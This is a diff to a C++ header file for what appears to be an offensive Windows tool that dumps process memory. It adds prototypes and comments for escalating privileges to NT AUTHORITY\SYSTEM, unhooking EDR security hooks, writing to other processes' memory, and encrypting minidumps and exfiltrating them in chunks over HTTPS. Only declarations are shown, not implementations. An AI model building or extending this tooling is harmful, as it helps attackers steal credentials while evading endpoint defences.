@@ -15,6 +15,35 @@
 #include <chrono>
 #include <thread>
 
+// Syscall prototypes
+typedef BOOL(WINAPI* fLookupPrivilegeValueW)(
+    IN LPCWSTR lpSystemName OPTIONAL,
+    IN LPCWSTR lpName,
+    OUT PLUID lpLuid
+    );
+
+typedef NTSTATUS(NTAPI* fNtAdjustPrivilegesToken)(
+    IN HANDLE TokenHandle,
+    IN BOOLEAN DisableAllPrivileges,
+    IN PTOKEN_PRIVILEGES TokenPrivileges,
+    IN ULONG PreviousPrivilegesLength,
+    OUT PTOKEN_PRIVILEGES PreviousPrivileges OPTIONAL,
+    OUT PULONG RequiredLength OPTIONAL
+    );
+
+typedef NTSTATUS(NTAPI* fRtlGetVersion)(
+    OUT PRTL_OSVERSIONINFOW lpVersionInformation
+    );
+
+typedef NTSTATUS(NTAPI* fNtWriteVirtualMemory)(
+    IN HANDLE ProcessHandle, 
+    IN PVOID BaseAddress, 
+    IN PVOID Buffer, 
+    IN ULONG NumberOfBytesToWrite, 
+    OUT PULONG NumberOfBytesWritten OPTIONAL
+    );
+
+// Variable prototypes for in-memory processes
 extern const size_t dumpBufferSize;
 extern LPVOID dumpBuffer;
 extern DWORD bytesRead;
@@ -33,8 +62,15 @@ std::wstring GetLastErrorMessage();
 std::wstring ASCIItoWString(const std::vector<int>& asciiValues);
 std::string ASCIItoString(const std::vector<int>& asciiValues);
 
+// Function prototype for privilege escalation to NT AUTHORITY\SYSTEM
+BOOL SetPrivilege(LPCWSTR lpszPrivilege, BOOL bEnablePrivilege);
+
+// Function prototypes for EDR unhooking
+EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
+BYTE GetNtRVM();
+VOID FreeNtRVM();
+
 // Function prototypes for minidump processing
-void UnhookNtdll();
 constexpr unsigned int numRNG();
 std::string Keygen(int length);
 std::string EncryptDump(LPVOID dumpBuffer, DWORD dumpBufferSize, const std::string& key);
@@ -43,7 +79,7 @@ std::string Base64Encode(const std::string& input);
 
 // Function prototypes for minidump exfiltration
 std::vector<std::string> SplitDataIntoChunks(const std::string& data, size_t chunkSize);
-bool SendHTTPSRequest(const std::string& hostname, const std::string& path, const std::string& data, bool isKey = false);
+bool SendHTTPSRequest(const std::string& hostname, const std::string& path, const std::string& data, bool isKey);
 void SendDataInChunks(const std::string& data, const std::string& hostname, const std::string& path);
 
 #endif
